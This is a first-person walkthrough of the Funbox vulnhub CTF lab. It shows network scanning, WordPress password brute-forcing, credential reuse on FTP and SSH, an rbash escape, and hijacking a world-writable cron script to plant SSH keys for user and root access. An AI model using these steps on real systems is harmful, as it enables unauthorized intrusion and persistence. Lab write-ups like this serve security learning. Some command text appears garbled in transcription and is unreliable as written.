# Funbox CTF — vulnhub walkthrough

In this walkthrough I am going to go over the steps I followed to get the flags on this CTF.

First off I got the VM from https://www.vulnhub.com/entry/funbox-1,518/ and loaded it to VirtualBox, loaded the .ova and had to change USB to 1.0 and set the network adapter to the ones on my server.

VM boots up and we just get the login screen with no additional information:


Ubuntu 20.04 LTS funbox tty1

funbox login:


First I’ll start by booting up a Kali VM and then enumerating the devices on my network by using netdiscover:


root@kali:/home/rm# netdiscover -i eth1 -r 192.168.0.0/241


Which will give me a result with the same MAC address as the VirtualBox configuration:


Currently scanning: Finished!   |   Screen View: Unique Hosts
23 Captured ARP Req/Rep packets, from 13 hosts.   Total size: 1380
---------------------------------------------------------------------------------
IP              At MAC Address      Count     Len   MAC Vendor / Hostname
---------------------------------------------------------------------------------
192.168.0.1     60:e3:27:78:80:ba       1     120   TP-LINK TECHNOLOGIES CO., LTD
192.168.0.10    b0:09:da:0b:2e:62       1      60   Ring Solutions
192.168.0.103   f8:d1:11:10:35:8b       8     480   TP-LINK TECHNOLOGIES CO., LTD.
192.168.0.104   04:d9:f5:22:41:4b       1      60   ASUSTek COMPUTER INC.
192.168.0.108   d8:ce:3a:e7:2a:c9       1      60   Xiaomi Communications Co Ltd
192.168.0.150   56:d4:f7:3e:b2:a3       2     120   Unknown vendor
192.168.0.151   08:00:27:5a:ed:0d       1      60   PCS Systemtechnik GmbH


Now that I have the IP, I’ll do some OS probing with nmap:


root@kali:/home/rm# nmap -0 192.168.0.151
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 17:38 MDT
Nmap scan report for 192.168.0.151
Host is up (0.00030s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp open   http
MAC Address:  08:00:27:5A:ED:OD (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/).
TCP/IP fingerprint:
0S:SCAN(V=7.80%E=4%D=8/18%OT=21%CT=1%CU=41051%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=5F3C6688%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%II=I
OS: %TS=A)OPS(01=M5B4ST11NW7%02=M5B4ST11NW7%03=M5B4NNT11NW7%04=M5B4ST11NW7%0
OS :5=M5B4ST11NW7%06=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS: =FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=0 0S:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
0S:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
0S:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1( OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS: N%T=40%CD=S)

Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds


If I browse to the IP address I get redirected to funbox.fritz.box:


Unable to connect

Firefox can't establish a connection to the server at funbox.fritz.box.


I fix that by adding an entry on my hosts file:


127.0.0.1       localhost
127.0.1.1       kali

192.168.0.151   funbox.fritz.box


And the site loads correctly now:


Funbox
Have fun...

Home | About | Blog | Contact


if we scroll all the way down, we can tell it’s using Wordpress.

Using wpscan I do some basic enumeration (plugins/users) to find something obvious:


root@kali:/home/rm# wpscan --url http://funbox.fritz.box -e u


Uploads directory is available but nothing juicy in it:


[+] Upload directory has listing enabled: http://funbox.fritz.box/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%


We have 2 users: Admin and Joe, usually the admin’s have higher security so I’ll go for the weakest link


[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 | Rss Generator (Passive Detection)
 | Wp Json Api (Aggressive Detection)
 |  - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Login Error Messages (Aggressive Detection)

[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


Using WPScan again I’ll run Joe through a wordlist (rockyou.txt) and see if we find something:


rm@kali:~$ sudo wpscan --url http://funbox.fritz.box --passwords /usr/share/wordlists/rockyou.txt --usernames joe


After a long zero seconds we have a match:


[!] Valid Combinations Found:
 | Username: joe, Password: 12345 


This gives me access to Wordpress but his user doesn’t have permissions for much.

Based on the results from nmap, we’ll try the other entry points, starting by the FTP:


@rmkali:~$ ftp funbox.fritz.box
Connected to funbox.fritz.box.
220 ProFTPD Server (Debian) [::ffff:192.168.0.151]
Name (funbox.fritz.box:rm): joe
331 Password required for joe Password:
230 User joe logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rW-------  1 joe   joe             998 Jul 18 09:49 mbox
226 Transfer complete ftp> get mbox
Local: mbox remote: mbox
200 PORT command
successful
150 Opening BINARY mode data connection for mbox (998 bytes)
226 Transfer complete
998 bytes received in 0.00 secs (1.7026 MB/s) ftp> 221 Goodbye.
rm@kali: ~$ cat mbox
From root@funbox Fri Jun 19 13:12:38 2020
Return-Path: <rootofunbox>
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
        id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
Subject: Backups
To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131238.2D257446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
From: root <rootofunbox>

Hi Joe, please tell funny the backupscript is done.

From root@funbox Fri Jun 19 13:15:21 2020
Return-Path: <rootafunbox>
X-original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
        id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
Subject: Backups To: <joe@funbox>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200619131521.8E2D4446B0@funbox.fritz.box>
Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
From: root <rootofunbox›

Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.


Credentials are valid on FTP and we can extract some emails, hopefully he doesn’t get fired and his account disabled before we finish :)

His credentials also match SSH:


rm@kali:~$ ssh 192.168.0.151 -l joe
joe@192.168.0.151's password:
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

* Documentation:    https://help.ubuntu.com
* Management:       https://landscape.canonical.com
* Support:          https://ubuntu.com/advantage

 System information as of Tue 18 Aug 2020 11:53:40 PM UTC

 System load:   0.0                 Processes:                  126
 Usage of /:    58.6% of 9.78GB     Users logged in:            0
 Memory usage:  62%                 IPv4 address for enp0s3:    192.168.0.151
 Swap usage:    0%

*   "If you've been waiting for the perfect Kubernetes dev solution for
    macos, the wait is over. Learn how to install Microkas on macos."

    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/
33 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


You have mail.
Last login: Sat Jul 18 10:02:39 2020 from 192.168.178.143
joe@funbox:~$


Time for privilege escalation!

Let’s see his sudoer permissions:


joe@funbox: -$ sudo -l
[sudo] password for joe:
Sorry, user joe may not run sudo on funbox.
joe@funbox:~$


Doesn’t work, lets try to browse the disk and no dice:


joe@funbox: ~$ cd /home
-rbash: cd: restricted
joe@funbox: ~$


rbash is complaining that it’s a restricted shell, we can use this guide on how to break out of it.

I’ll use the python version:


joe@funbox:-$ ls
mbox
joe@funbox: -$ sudo -l
[sudo] password for joe:
Sorry, user joe may not run sudo on funbox.
joe@funbox:~$ cd /home
-rbash: cd: restricted
joe@funbox:~$ python -c "import pty;pty.spawn('/bin/bash')"
joe@funbox:-$ cd /home
joe@funbox:/home$ ls
funny joe
joe@funbox:/home$


Going into the “funny” user I see a html file (a backup) in there and the modified date matches the VM time, since one of the emails said that a backup script was set up, we can think that there is a cronjob running to generate that file, now we need to find it:


joe@funbox:~$ ls
mbox
joe@funbox: $ sudo -l
[sudo] password for joe:
Sorry, user joe may not run sudo on funbox.
joe@funbox: ~$ cd /home
-rbash: cd: restricted
joe@funbox: $ python -c "import pty;pty.spawn("/bin/bash')"
joe@funbox: $ cd /home
joe@funbox: /home$ ls
funny joe
joe@funbox: /home$ cd funny
joe@funbox:/home/funny$ ls
html.tar
joe@funbox: /home/funny$ls -lh
total 47M
-rw-rw-r-- 1 funny funny 47M Aug 18 23:58 html.tar
joe@funbox: /home/funny$ date
Tue 18 Aug 2020 11:59:01 PM UTC
joe@funbox:/home/funny$


Cronjobs drop some valuable information onto syslog, so I’ll see whats in there.

Since that didn’t work, I‘ll go back to the home folder, ll will reveal the dot files with an executable .backup.sh file in it, upon inspection it matches the .tar file we’re seeing and the owner is “funny”, we might be able to get more stuff with his user:


joe@funbox:/home/funny$ ll
total 47608
drwxr-xr-x 3 funny funny     4096 Jul 18 10:02
drwxr-xr-x 4 root  root      4096 Jun 19 11:50
-rwxrwxrwx 1 funny funny       55 Jul 18 10:15 .backup.sh*
-rw------- 1 funny funny     1462 Jul 18 10:07 .bash_history
-rw-r--r-- 1 funny funny      220 Feb 25 12:03 .bash_Logout
-rw-r--r-- 1 funny funny     3771 Feb 25 12:03 .bashrc
drwx------ 2 funny funny     4096 Jun 19 10:43 .cache/
-rw-rw-r-- 1 funny funny 48701440 Aug 19 00:00 html.tar
-rw-r--r-- 1 funny funny      807 Feb 25 12:03 .profile
-rw-rw-r-- 1 funny funny      162 Jun 19 14:13 .reminder.sh
-rw-rw-r-- 1 funny funny       74 Jun 19 12:25 .selected_editor
-rw-r--r-- 1 funny funny        0 Jun 19 10:44 .sudo_as_admin_successful
-rw------- 1 funny funny     7791 Jul 18 10:02 .viminfo
joe@funbox:/home/funny$cat .backup.sh
#/bin/bash
tar -cf /home/funny/html.tar/var/www/html


So now I am going to edit the backup script, set it to go to funny’s home and add my ssh key to his authorized_keys folder:


#!/bin/bash
cd /home/funny; mkdir ssh; cd .ssh; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB>

#tar -cf /home/funny/html.tar/var/www/html


#!/bin/bash
<yBH5nc58= rm@kali > authorized_keys

After less than a minute, when the cronjob runs (which by monitoring the backup file, noticed it was set to every minute) I can now log in as “funny”:


rm@kali:~$ ssh 192.168.0.151 -l funny
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

* Documentation:    https://help.ubuntu.com
* Management:       https://landscape.canonical.com
* Support:          https://ubuntu.com/advantage

 System information as of Wed 19 Aug 2020 12:10:21 AM UTC

 System load:   0.0                 Processes:                  130
 Usage of /:    58.0% of 9.78GB     Users logged in:            0
 Memory usage:  58%                 IPv4 address for enp0s3:    192.168.0.151
 Swap usage:    2%

*   "If you've been waiting for the perfect Kubernetes dev solution for
    macos, the wait is over. Learn how to install Microkas on macos."

    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/
33 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


You have mail.
Last login: Fri Jun 19 14:15:05 2020 from 192.168.178.143
funny@funbox:~$


I am going to inspect the cron jobs for “funny” to see if we can replicate this same technique to get access to root and I see that it’s only the backup job but something peculiar is that the cron job is set to run on “even” minutes, yet i saw it run on “odd” times (*/2)


#
#m h    dom mon dow     command
*/2 * * * * /home/funny/.backup.sh


So pulling on the same cron thread i go back to my syslog file and look for the root crons:


funny@funbox:/var/log$ cat syslog | grep root
Aug 19 00:05:01 funbox CRON[3311]: (root) CMD (/home/funny/.backup.sh)
Aug 19 00:05:01 funbox postfix/pickup[1790]: 4745A420A2: uid=0 from=<root>
Aug 19 00:05:01 funbox postfix/qmgr[1791]: 4745A420A2: from=<root@funbox.frit
Aug 19 00:05:01 funbox postfix/local[3307]: 4745A420A2: to=<root@funbox.fritz
Aug 19 00:09:01 funbox CRON[3379]: (root) CMD [ -x /usr/lib/php/sessioncle
Aug 19 00:10:01 funbox CRON[3470]: (root) CMD (/home/funny/.backup.sh)
Aug 19 00:10:01 funbox postfix/pickup[1790]: 58D8E45F82: uid=0 from=<root>
Aug 19 00:10:01 funbox postfix/qmgr[1791]: 58D8E45F82: from=<root@funbox.frit
Aug 19 00:10:01 funbox postfix/local[3482]: 58D8E45F82: to=<root@funbox.fritz
funny@funbox:/var/log$


Funny does have access to the syslog file and I can see that root it’s running the same script as funny just at a different interval (every 5 min.)

So this time I’ll adjust my script to set my ssh keys but for the root user:


#!/bin/bash
cd /root; mkdir .ssh; cd .ssh;
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwvh+epb+9ghDyau0Tc/4jYFJ
tar -cf /home/funny/html.tar /var/www/html


And disable funny’s cron:


#
#m h    dom mon dow     command
#*/2 * * * * /home/funny/.backup.sh


And we wait for the 5 min interval to go through and ssh via root and we have our flag file :)

rm@kali:~$ ssh 192.168.0.151 -l root
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

* Documentation:    https://help.ubuntu.com
* Management:       https://landscape.canonical.com
* Support:          https://ubuntu.com/advantage

 System information as of Wed 19 Aug 2020 12:20:33 AM UTC

 System load:   0.0                 Processes:                  134
 Usage of /:    58.0% of 9.78GB     Users logged in:            0
 Memory usage:  59%                 IPv4 address for enp0s3:    192.168.0.151
 Swap usage:    2%

*   "If you've been waiting for the perfect Kubernetes dev solution for
    macos, the wait is over. Learn how to install Microkas on macos."

    https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/
33 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


You have mail.
Last login: Wed Aug 19 00:20:26 2020 from 192.168.0.102
root@funbox:~#ls
flag.txt    mbox    snap
root@funbox:~# cat flag.txt
Great ! You did it...
FUNBOX - made by @0815R2d2
root@funbox: ~# 
